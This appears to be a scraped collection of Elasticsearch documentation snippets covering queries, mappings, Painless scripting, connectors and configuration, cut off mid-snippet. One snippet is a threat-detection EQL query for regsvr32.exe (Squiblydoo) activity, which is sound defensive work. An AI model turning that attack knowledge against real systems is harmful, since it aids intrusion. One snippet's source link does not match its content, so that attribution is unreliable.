https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/percolator.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/match_value\n{\n  \"query\": {\n    \"match\": {\n      \"field\": \"value\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an API Key for Notion Connector\nDESCRIPTION: Example of creating an API key for the Notion connector using the Elasticsearch API. This key grants necessary permissions for the connector to function, including monitor and manage_connector privileges.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-notion.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"connector_name-connector-api-key\",\n  \"role_descriptors\": {\n    \"connector_name-connector-role\": {\n      \"cluster\": [\n        \"monitor\",\n        \"manage_connector\"\n      ],\n      \"indices\": [\n        {\n          \"names\": [\n            \"index_name\",\n            \".search-acl-filter-index_name\",\n            \".elastic-connectors*\"\n          ],\n          \"privileges\": [\n            \"all\"\n          ],\n          \"allow_restricted_indices\": false\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Including MEDIAN Function Documentation Sections in Markdown\nDESCRIPTION: This snippet demonstrates the structure of the documentation, using Markdown syntax to include various sections related to the MEDIAN function in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/median.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `MEDIAN` [esql-median]\n\n**Syntax**\n\n:::{image} ../../../images/functions/median.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/median.md\n:::\n\n:::{include} ../description/median.md\n:::\n\n:::{include} ../types/median.md\n:::\n\n:::{include} ../examples/median.md\n:::\n\n:::{include} ../appendix/median.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Using IN Operator with Date Math in Elasticsearch SQL\nDESCRIPTION: Example demonstrating how to use the IN operator with date math expressions to match multiple date ranges.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSELECT hire_date FROM emp WHERE hire_date IN ('1987-03-01||+2y/M', '1987-03-01||+3y/M');\n\n       hire_date\n------------------------\n1989-03-31T00:00:00.000Z\n1990-03-02T00:00:00.000Z\n```\n\n----------------------------------------\n\nTITLE: Using Apostrophe Token Filter with Analyze API - Elasticsearch Console\nDESCRIPTION: This snippet demonstrates the use of the analyze API to test the apostrophe token filter, which is designed to strip characters occurring after an apostrophe, including the apostrophe itself. The input text 'Istanbul'a veya Istanbul'dan' will be processed to yield the specified tokens. No dependencies beyond Elasticsearch itself are needed, and it expects a request in the proper format, outputting the array of tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-apostrophe-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\" : \"standard\",\n  \"filter\" : [\"apostrophe\"],\n  \"text\" : \"Istanbul'a veya Istanbul'dan\"\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Analysis Result with Polish Stop Token Filter\nDESCRIPTION: This snippet shows the result of analyzing a Polish text with the custom analyzer using the polish_stop filter. It demonstrates how stopwords are removed from the input text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-polish-stop.md#2025-04-21_snippet_2\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"tokens\" : [\n    {\n      \"token\" : \"kucharek\",\n      \"start_offset\" : 6,\n      \"end_offset\" : 14,\n      \"type\" : \"<ALPHANUM>\",\n      \"position\" : 1\n    },\n    {\n      \"token\" : \"sześć\",\n      \"start_offset\" : 15,\n      \"end_offset\" : 20,\n      \"type\" : \"<ALPHANUM>\",\n      \"position\" : 2\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Using NOT Operator in Elasticsearch SQL\nDESCRIPTION: Demonstrates the NOT logical operator to negate a condition. This example selects the last_name field from the test_emp index where emp_no is NOT equal to 10000.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-operators-logical.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSELECT last_name l FROM \"test_emp\" WHERE NOT emp_no = 10000 LIMIT 5;\n```\n\n----------------------------------------\n\nTITLE: Gradle Task Execution List\nDESCRIPTION: Comprehensive list of Gradle tasks to be executed for building Elasticsearch components, including compilation, resource processing, and JAR creation tasks.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/simdvec/output.txt#2025-04-21_snippet_16\n\nLANGUAGE: text\nCODE:\n```\nTasks to be executed: [task ':libs:simdvec:cleanTest', task ':libs:logging:compileJava', task ':libs:core:compileJava', task ':libs:native:compileJava', task ':libs:simdvec:compileJava', task ':libs:simdvec:processResources', task ':libs:simdvec:classes', task ':libs:simdvec:compileMain21Java', task ':libs:simdvec:processMain21Resources', task ':libs:simdvec:main21Classes', task ':libs:simdvec:compileMain22Java', task ':libs:simdvec:processMain22Resources', task ':libs:simdvec:main22Classes', task ':libs:simdvec:jar']\n```\n\n----------------------------------------\n\nTITLE: Using _local Preference Parameter in Elasticsearch\nDESCRIPTION: Demonstrates the _local preference parameter which routes search requests to locally available shards when possible, falling back to other nodes if needed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/licenses/slf4j-api-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\npreference=_local\n```\n\n----------------------------------------\n\nTITLE: Defining Geohex to Shape Ingest Pipeline in Elasticsearch\nDESCRIPTION: Creates an ingest pipeline named 'geohex2shape' that converts H3 cells to polygons in WKT format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/ingest-geo-grid-processor.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT _ingest/pipeline/geohex2shape\n{\n  \"description\": \"translate H3 cell to polygon\",\n  \"processors\": [\n    {\n      \"geo_grid\": {\n        \"field\": \"geocell\",\n        \"tile_type\": \"geohex\",\n        \"target_format\": \"wkt\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Array Access Operations in Painless\nDESCRIPTION: Shows how to access and modify array elements using the array access operator '[]'. Includes examples with single-dimensional arrays, def type arrays, and multi-dimensional arrays.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-array.md#2025-04-21_snippet_1\n\nLANGUAGE: painless\nCODE:\n```\nint[] x = new int[2];\nx[0] = 2;\nx[1] = 5;\nint y = x[0] + x[1];\nint z = 1;\nint i = x[z];\n```\n\nLANGUAGE: painless\nCODE:\n```\ndef d = new int[2];\nd[0] = 2;\nd[1] = 5;\ndef x = d[0] + d[1];\ndef y = 1;\ndef z = d[y];\n```\n\nLANGUAGE: painless\nCODE:\n```\nint[][][] ia3 = new int[2][3][4];\nia3[1][2][3] = 99;\nint i = ia3[1][2][3];\n```\n\n----------------------------------------\n\nTITLE: EQL Lookup Operators\nDESCRIPTION: Demonstrates various lookup operators in EQL for case-sensitive and case-insensitive matching against lists of values or patterns.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_6\n\nLANGUAGE: eql\nCODE:\n```\nmy_field in (\"Value-1\", \"VALUE2\", \"VAL3\")                 // case-sensitive\nmy_field in~ (\"value-1\", \"value2\", \"val3\")                // case-insensitive\n\nmy_field not in (\"Value-1\", \"VALUE2\", \"VAL3\")             // case-sensitive\nmy_field not in~ (\"value-1\", \"value2\", \"val3\")            // case-insensitive\n\nmy_field : (\"value-1\", \"value2\", \"val3\")                  // case-insensitive\n\nmy_field like  (\"Value-*\", \"VALUE2\", \"VAL?\")              // case-sensitive\nmy_field like~ (\"value-*\", \"value2\", \"val?\")              // case-insensitive\n\nmy_field regex  (\"[vV]alue-[0-9]\", \"VALUE[^2].?\", \"VAL3\") // case-sensitive\nmy_field regex~  (\"value-[0-9]\", \"value[^2].?\", \"val3\")   // case-insensitive\n```\n\n----------------------------------------\n\nTITLE: Defining Solr Format Synonyms in Elasticsearch\nDESCRIPTION: Examples of defining synonyms using the Solr format. Includes both equivalent synonyms and explicit synonyms definitions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-synonym-tokenfilter.md#2025-04-21_snippet_4\n\nLANGUAGE: text\nCODE:\n```\nipod, i-pod, i pod\ncomputer, pc, laptop\n```\n\nLANGUAGE: text\nCODE:\n```\npersonal computer => pc\nsea biscuit, sea biscit => seabiscuit\n```\n\n----------------------------------------\n\nTITLE: Advanced Sync Rules for Redis Connector - Excluding Keys with Pattern\nDESCRIPTION: JSON configuration for advanced sync rules to exclude Redis database records where keys start with 'test1', 'test2', or 'test3'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-redis.md#2025-04-21_snippet_6\n\nLANGUAGE: js\nCODE:\n```\n[\n  {\n    \"database\": 0,\n    \"key_pattern\": \"test[^123]\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Indexing GeoShape Data in Elasticsearch\nDESCRIPTION: This code snippet demonstrates how to index a document with `geo_shape` data in Elasticsearch. It inserts a document into the `example` index with a `location` field defined as a point using GeoJSON format. The refresh parameter ensures the document is immediately searchable.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-shape-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /example/_doc?refresh\n{\n  \"name\": \"Wind & Wetter, Berlin, Germany\",\n  \"location\": {\n    \"type\": \"point\",\n    \"coordinates\": [ 13.400544, 52.530286 ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using CURRENT_TIMESTAMP Keyword in Elasticsearch SQL\nDESCRIPTION: Example showing how to use CURRENT_TIMESTAMP as a keyword to get the current date and time.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_17\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CURRENT_TIMESTAMP AS result;\n\n         result\n------------------------\n2018-12-12T14:48:52.448Z\n```\n\n----------------------------------------\n\nTITLE: Creating Index with Synthetic Source for IP Range Field\nDESCRIPTION: This example shows creating an index with synthetic _source and an ip_range field. It illustrates how IP ranges are deduplicated and CIDR notation is expanded in the synthetic source output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/range.md#2025-04-22_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"my_range\": { \"type\": \"ip_range\" }\n    }\n  }\n}\n\nPUT idx/_doc/1\n{\n  \"my_range\": [\n    \"10.0.0.0/24\",\n    {\n      \"gte\": \"10.0.0.0\",\n      \"lte\": \"10.0.0.255\"\n    }\n  ]\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"my_range\": {\n      \"gte\": \"10.0.0.0\",\n      \"lte\": \"10.0.0.255\"\n    }\n\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Persistent Tasks Allocation in Elasticsearch\nDESCRIPTION: These settings control the allocation of persistent tasks to nodes in an Elasticsearch cluster. 'cluster.persistent_tasks.allocation.enable' enables or disables task allocation, while 'cluster.persistent_tasks.allocation.recheck_interval' sets the frequency of allocation checks.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/miscellaneous-cluster-settings.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\ncluster.persistent_tasks.allocation.enable: all\ncluster.persistent_tasks.allocation.recheck_interval: 30s\n```\n\n----------------------------------------\n\nTITLE: Configuring Discovery Seed Providers in Elasticsearch\nDESCRIPTION: Static setting that specifies which seed hosts provider types to use for obtaining seed node addresses. Defaults to settings-based provider.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/discovery-cluster-formation-settings.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\ndiscovery.seed_providers: settings\n```\n\n----------------------------------------\n\nTITLE: EQL IndexOf Function Examples\nDESCRIPTION: Examples demonstrating the indexOf function for finding substring positions with optional start position parameter. Includes case sensitivity and null handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-function-ref.md#2025-04-21_snippet_6\n\nLANGUAGE: eql\nCODE:\n```\n// url.domain = \"subdomain.example.com\"\nindexOf(url.domain, \"d\")        // returns 3\nindexOf(url.domain, \"D\")        // returns null\nindexOf(url.domain, \".\")        // returns 9\nindexOf(url.domain, \".\", 9)     // returns 9\nindexOf(url.domain, \".\", 10)    // returns 17\nindexOf(url.domain, \".\", -6)    // returns 9\n\n// Make matching case-insensitive\nindexOf~(url.domain, \"D\")        // returns 4\n\n// empty strings\nindexOf(\"\", \"\")                 // returns 0\nindexOf(url.domain, \"\")         // returns 0\nindexOf(url.domain, \"\", 9)      // returns 9\nindexOf(url.domain, \"\", 10)     // returns 10\nindexOf(url.domain, \"\", -6)     // returns 0\n\n// missing substrings\nindexOf(url.domain, \"z\")        // returns null\nindexOf(url.domain, \"z\", 9)     // returns null\n\n// start position is higher than string length\nindexOf(url.domain, \".\", 30)    // returns null\n\n// null handling\nindexOf(null, \".\", 9)           // returns null\nindexOf(url.domain, null, 9)    // returns null\nindexOf(url.domain, \".\", null)  // returns null\n```\n\n----------------------------------------\n\nTITLE: Configuring Queue Capacity for Enrich Coordinator Proxy in Elasticsearch YAML\nDESCRIPTION: Sets the coordinator queue capacity. By default, it's calculated as max_concurrent_requests * max_lookups_per_request.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/enrich-settings.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nenrich.coordinator_proxy.queue_capacity: 1024\n```\n\n----------------------------------------\n\nTITLE: Defining Unsigned Long Mapping in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create an index with a mapping that includes an unsigned long field type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/unsigned-long.md#2025-04-22_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my_index\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_counter\": {\n        \"type\": \"unsigned_long\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Double Colon (::) Cast Operator in Elasticsearch SQL\nDESCRIPTION: This example demonstrates how to use the double colon (::) operator as an alternative to the CAST function to convert a string value to a long integer type in Elasticsearch SQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-operators-cast.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSELECT '123'::long AS long;\n\n      long\n---------------\n123\n```\n\n----------------------------------------\n\nTITLE: Indexing a Point Shape in GeoJSON Format\nDESCRIPTION: This example shows how to index a point shape in GeoJSON format. The point is defined with a type and coordinates array specifying the x,y position in cartesian space.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/shape.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : {\n    \"type\" : \"point\",\n    \"coordinates\" : [-377.03653, 389.897676]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering IP Addresses Using CIDR_MATCH Function in ESQL\nDESCRIPTION: This ESQL query filters records from the 'hosts' table where the 'ip1' field matches either of two CIDR ranges. The CIDR_MATCH function evaluates whether IP addresses fall within specified CIDR ranges, and the KEEP command restricts the output to only the specified fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/cidr_match.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM hosts\n| WHERE CIDR_MATCH(ip1, \"127.0.0.2/32\", \"127.0.0.3/32\")\n| KEEP card, host, ip0, ip1\n```\n\n----------------------------------------\n\nTITLE: Advanced Sync Rules for S3 Connector - Elasticsearch - JavaScript\nDESCRIPTION: This JavaScript snippet demonstrates how to define advanced sync rules for fetching data from specific S3 buckets using prefixes and file extensions. These rules refine the data sync process for the connector.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-s3.md#2025-04-21_snippet_5\n\nLANGUAGE: js\nCODE:\n```\n[\n  {\n    \"bucket\": \"bucket1\",\n    \"prefix\": \"folder1/docs\"\n  }\n]\n\n[\n  {\n    \"bucket\": \"bucket2\",\n    \"prefix\": \"folder1\"\n  }\n]\n\n[\n  {\n    \"bucket\": \"bucket2\",\n    \"prefix\": \"abc\",\n    \"extension\": [\".txt\", \".png\"]\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Keyword Tokenizer\nDESCRIPTION: Demonstrates the basic usage of the keyword tokenizer, which outputs the entire input text as a single term without breaking it into multiple tokens\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-keyword-tokenizer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _analyze\n{\n  \"tokenizer\": \"keyword\",\n  \"text\": \"New York\"\n}\n```\n\n----------------------------------------\n\nTITLE: Using MV_FIRST with SPLIT in ESQL\nDESCRIPTION: This snippet demonstrates how to split a string using the SPLIT function and extract the first element using MV_FIRST. It takes a string with semicolon-delimited values, splits it into an array, and returns the first element.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_first.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=\"foo;bar;baz\"\n| EVAL first_a = MV_FIRST(SPLIT(a, \";\"))\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Certificate Utility Command Synopsis\nDESCRIPTION: Complete command syntax showing all available modes (ca, cert, csr, http) and their respective parameters including options for certificate generation, key management, and configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/certutil.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-certutil\n(\n(ca [--ca-dn <name>] [--keyusage <key_usages>] [--days <n>] [--pem])\n\n| (cert ([--ca <file_path>] | [--ca-cert <file_path> --ca-key <file_path>])\n[--ca-dn <name>] [--ca-pass <password>] [--days <n>]\n[--dns <domain_name>] [--in <input_file>] [--ip <ip_addresses>]\n[--multiple] [--name <file_name>] [--pem] [--self-signed])\n\n| (csr [--dns <domain_name>] [--in <input_file>] [--ip <ip_addresses>]\n[--name <file_name>])\n\n[-E <KeyValuePair>] [--keysize <bits>] [--out <file_path>]\n[--pass <password>]\n)\n\n| http\n\n[-h, --help] ([-s, --silent] | [-v, --verbose])\n```\n\n----------------------------------------\n\nTITLE: Text Categorization with Similarity Threshold\nDESCRIPTION: Demonstrates using categorization_filters with a custom similarity threshold to control category grouping behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-categorize-text-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPOST log-messages/_search?filter_path=aggregations\n{\n  \"aggs\": {\n    \"categories\": {\n      \"categorize_text\": {\n        \"field\": \"message\",\n        \"categorization_filters\": [\"\\\\w+\\\\_\\\\d{3}\"],\n        \"similarity_threshold\": 11\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Apache License Boilerplate Notice\nDESCRIPTION: This code snippet provides the boilerplate notice required to apply the Apache License, Version 2.0 to your work.  It includes placeholders for the copyright year and the name of the copyright owner, which must be replaced with the correct values.  The notice should be placed in the appropriate comment syntax for the file format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/lib/nimbus-jose-jwt-modified-part1/licenses/nimbus-jose-jwt-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: Text\nCODE:\n```\n\"Copyright [yyyy] [name of copyright owner]\\n\\n   Licensed under the Apache License, Version 2.0 (the \\\"License\\\");\\n   you may not use this file except in compliance with the License.\\n   You may obtain a copy of the License at\\n\\n       http://www.apache.org/licenses/LICENSE-2.0\\n\\n   Unless required by applicable law or agreed to in writing, software\\n   distributed under the License is distributed on an \\\"AS IS\\\" BASIS,\\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\\n   See the License for the specific language governing permissions and\\n   limitations under the License.\"\n```\n\n----------------------------------------\n\nTITLE: ESQL Field Type Support Table - Markdown\nDESCRIPTION: A markdown table showing field type to result type mappings for ESQL functions. All listed field types (date, date_nanos, double, integer, keyword, long, text, unsigned_long) map to a date result type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/to_datetime.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | result |\n| --- | --- |\n| date | date |\n| date_nanos | date |\n| double | date |\n| integer | date |\n| keyword | date |\n| long | date |\n| text | date |\n| unsigned_long | date |\n```\n\n----------------------------------------\n\nTITLE: Computing MD5 Hash Using ESQL\nDESCRIPTION: This query filters out connection error messages, computes the MD5 hash of the 'message' field, and keeps only the original message and its MD5 hash. It demonstrates the use of the md5() function in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/md5.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM sample_data\n| WHERE message != \"Connection error\"\n| EVAL md5 = md5(message)\n| KEEP message, md5\n```\n\n----------------------------------------\n\nTITLE: Connecting to GCE Instance\nDESCRIPTION: Shows two methods to connect to the created GCE instance: using the Google Cloud SDK gcloud command or using standard SSH with the external IP address.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-long.md#2025-04-21_snippet_4\n\nLANGUAGE: sh\nCODE:\n```\n# Connect using google cloud SDK\ngcloud compute ssh myesnode1 --zone europe-west1-a\n\n# Or using SSH with external IP address\nssh -i ~/.ssh/google_compute_engine 192.158.29.199\n```\n\n----------------------------------------\n\nTITLE: Storing GCE Project ID Locally using gcloud CLI\nDESCRIPTION: Demonstrates how to save a Google Cloud project ID locally in the gcloud configuration to avoid repeating it in subsequent commands.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-tips.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\ngcloud config set project es-cloud\n```\n\n----------------------------------------\n\nTITLE: Creating a Regex Pattern in Painless\nDESCRIPTION: Demonstrates how to create a simple regex pattern constant in Painless. This pattern matches any vowel character.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-regexes.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\nPattern p = /[aeiou]/\n```\n\n----------------------------------------\n\nTITLE: Range Query for Unsigned Long in Elasticsearch\nDESCRIPTION: This snippet shows a range query for an unsigned long field, using string values to ensure precision.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/unsigned-long.md#2025-04-22_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /my_index/_search\n{\n    \"query\": {\n        \"range\" : {\n            \"my_counter\" : {\n                \"gte\" : \"9223372036854775808\",\n                \"lte\" : \"18446744073709551615\"\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Identity Equals with Reference Types in Painless\nDESCRIPTION: Shows how the identity equals operator works with reference types in Painless, including list creation and comparison.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_23\n\nLANGUAGE: painless\nCODE:\n```\nList a = new ArrayList(); \nList b = new ArrayList(); \nList c = a;               \nboolean c = a === b;      \nc = a === c;              \n```\n\n----------------------------------------\n\nTITLE: Buffer Base Class Definition\nDESCRIPTION: Defines the base Buffer class with the limit() method.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.nio.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nclass java.nio.Buffer {\n  int limit()\n}\n```\n\n----------------------------------------\n\nTITLE: Querying an Integer Range Field with Term Query in Elasticsearch\nDESCRIPTION: Example demonstrating how to use a term query to search for a specific value (12) within an integer_range field named 'expected_attendees'. The query matches because 12 is within the defined range of 10 to 20.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/range.md#2025-04-22_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET range_index/_search\n{\n  \"query\" : {\n    \"term\" : {\n      \"expected_attendees\" : {\n        \"value\": 12\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Hungarian Stop Words\nDESCRIPTION: Provides Hungarian stop words for Elasticsearch text analysis, linking to the corresponding Lucene file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_23\n\nLANGUAGE: markdown\nCODE:\n```\n`_hungarian_`\n:   [Hungarian stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/snowball/hungarian_stop.txt)\n```\n\n----------------------------------------\n\nTITLE: Check Command Line Usage with EQL\nDESCRIPTION: EQL query to find regsvr32.exe processes with command line parameters, helping identify potential Squiblydoo attacks.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-ex-threat-detection.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search\n{\n  \"query\": \"\"\"\n    process where process.name == \"regsvr32.exe\" and process.command_line.keyword != null\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Deleting Service Token Example\nDESCRIPTION: Example command for deleting a specific service token.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/service-tokens-command.md#2025-04-21_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-service-tokens delete elastic/fleet-server my-token\n```\n\n----------------------------------------\n\nTITLE: Using ASCII Function in Elasticsearch SQL\nDESCRIPTION: Returns the ASCII code value of the leftmost character of a string expression as an integer. Takes a string expression as input and returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nASCII(string_exp) <1>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT ASCII('Elastic');\n\nASCII('Elastic')\n----------------\n69\n```\n\n----------------------------------------\n\nTITLE: Defining Brazilian Stop Words\nDESCRIPTION: Defines Brazilian Portuguese stop words for use in Elasticsearch analysis, linked to their Lucene definition.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_8\n\nLANGUAGE: markdown\nCODE:\n```\n`_brazilian_` (Brazilian Portuguese)\n:   [Brazilian Portuguese stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/br/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: SQL Example of STDDEV_SAMP Function Usage\nDESCRIPTION: This example shows how STDDEV_SAMP can be used in a SELECT statement along with MIN and MAX to retrieve the minimum salary, maximum salary, and the sample standard deviation of the salary from the 'emp' table. The result displays these three values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_16\n\nLANGUAGE: sql\nCODE:\n```\n```sql\nSELECT MIN(salary) AS min, MAX(salary) AS max, STDDEV_SAMP(salary) AS stddev FROM emp;\n\n      min      |      max      |      stddev\n---------------+---------------+------------------\n25324          |74999          |13834.471662090747\n```\n```\n\n----------------------------------------\n\nTITLE: Promotion in Painless\nDESCRIPTION: Demonstrates how promotion works in Painless, where values are implicitly cast to compatible types for evaluation. It shows examples of promoting an `int` to a `double` and a `def` to a `float` during arithmetic operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-casting.md#2025-04-21_snippet_12\n\nLANGUAGE: painless\nCODE:\n```\ndouble d = 2 + 2.0; <1>\ndef x = 1;          <2>\nfloat f = x + 2.0F; <3>\n```\n\n----------------------------------------\n\nTITLE: Executing Boolean Field Script for Book Publication Year\nDESCRIPTION: This script uses the boolean_field context to determine if a book was published before 1972. It demonstrates how to work with date fields in Painless scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPOST /_scripts/painless/_execute\n{\n  \"script\": {\n    \"source\": \"\"\"\n      emit(doc['release_date'].value.year < 1972);\n    \"\"\"\n  },\n  \"context\": \"boolean_field\",\n  \"context_setup\": 